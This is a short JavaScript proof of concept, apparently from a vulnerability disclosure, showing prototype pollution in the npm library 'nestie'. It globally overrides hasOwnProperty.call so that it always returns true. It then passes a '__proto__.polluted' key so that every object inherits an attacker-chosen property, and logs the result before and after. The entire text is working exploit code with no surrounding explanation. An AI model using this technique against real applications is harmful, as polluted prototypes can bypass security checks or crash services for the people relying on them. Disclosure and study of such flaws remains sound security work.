Object.prototype.hasOwnProperty.call = () => true;
const {nestie} = require('nestie');
obj = {};
console.log({}.polluted);
nestie({ '__proto__.polluted': 'yes' });
console.log({}.polluted);